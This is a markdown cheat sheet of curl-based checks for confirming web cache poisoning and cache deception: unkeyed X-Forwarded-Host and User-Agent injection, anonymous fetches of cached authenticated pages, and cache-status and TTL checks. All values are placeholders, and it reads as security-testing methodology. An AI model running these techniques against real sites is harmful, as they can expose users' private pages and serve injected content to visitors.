# Readback oracles — confirming the poisoning without a full serve

The oracles — how to confirm the stored copy carries your input.

---

## 1. The clean-request oracle — the different-requester serve

```bash
# the poisoning request — a cachebuster key
curl "$BASE/page?cb=<unique>" -H 'X-Forwarded-Host: <marker>'  # stores it
# the clean request — a different session, the same URL
curl "$BASE/page?cb=<unique>"   # <marker> reflected? → the stored copy serves it
```

```text
the clean-request oracle: a request WITHOUT the input reflects the
marker — the stored copy serves YOUR input to a different requester —
the confirm.
```

## 2. The cache-status oracle — the HIT/MISS

```bash
# the second request — a cache HIT means the stored copy served it
curl -sI "$BASE/page?cb=<unique>" | grep -iE 'x-cache|cf-cache|age'
#   X-Cache-Status: HIT → the stored copy served it
```

## 3. The marker oracle — the reflected input

```bash
# a unique marker — the stored copy's reflection
curl "$BASE/page?cb=<unique>" -H 'X-Forwarded-Host: <unique-marker>'
curl "$BASE/page?cb=<unique>" | grep '<unique-marker>'   # the marker reflects → poisoned
```

## 4. The link oracle — the URL-rewrite

```bash
# a host-rewrite — the stored copy's links use YOUR host
curl "$BASE/page?cb=<unique>" -H 'X-Forwarded-Host: <marker>'
curl "$BASE/page?cb=<unique>" | grep -oE 'src="[^"]*<marker>[^"]*"'   # a link points to <marker>
```

## 5. The privileged-page oracle — the deception confirm

```bash
# an authenticated GET stores the privileged page
curl "$BASE/settings.html?cb=<unique>" -H 'Cookie: <auth>'
# an anonymous GET — the stored copy serves the privileged content
curl "$BASE/settings.html?cb=<unique>" | grep 'settings\|profile\|<privileged-content>'
#   the privileged content in the anonymous response → deception
```

## 6. The injected-content oracle — the stored payload

```bash
# a reflected payload — the stored copy carries it
curl "$BASE/page?cb=<unique>" -H 'User-Agent: <payload>'
curl "$BASE/page?cb=<unique>" | grep '<payload>'   # the payload reflects → poisoned
```

## 7. The cachebuster oracle — the keyed-param confinement

```bash
# a cachebuster — the stored copy is keyed per-cb
curl "$BASE/page?cb=<unique>" -H 'X-Forwarded-Host: <marker>'  # stored under /page?cb=<unique>
curl "$BASE/page?cb=<unique>"   # only this key's requests get the poisoned copy
curl "$BASE/page?cb=<other>"    # a different key — the clean copy
```

## 8. The TTL oracle — the deception's persistence

```bash
# the stored copy's age — the TTL's remaining window
curl -sI "$BASE/page?cb=<unique>" | grep -iE 'age|cache-control'
#   Age: 30 → the copy is 30s old — the TTL's window
```

## 9. The per-surface oracle map — which oracle for which input

```text
a reflected header    → the marker oracle (the stored copy's reflection)
a host-rewrite        → the link oracle (the stored copy's links)
a privileged page     → the privileged-page oracle (the anonymous serve)
a reflected payload   → the injected-content oracle (the stored payload)
a cache-status        → the HIT oracle (the stored copy served it)
a TTL                 → the age oracle (the deception's persistence)
```

## 10. The oracle's falsifier — a keyed input

```text
a keyed input → a per-input entry → YOUR copy, not a shared one →
the clean request doesn't reflect → a different class.
```

## 11. The oracle's edge — a MISS reflection

```text
a marker reflected on a MISS → the response came from the origin —
a REFLECTION, not a poisoning — the stored copy didn't serve it.
the oracle requires a HIT — the stored copy's serve.
```

## 12. The oracle's confirm — the three-part evidence

```text
the poison confirm:
1. the probe request STORED — a HIT on the second identical request
2. the keyed input left OUT of the cache key — the unkeyed input
3. the reflected value reaching a response the victim receives —
   the clean request reflects the marker
a reflected header on a MISS is not a poisoning.
```
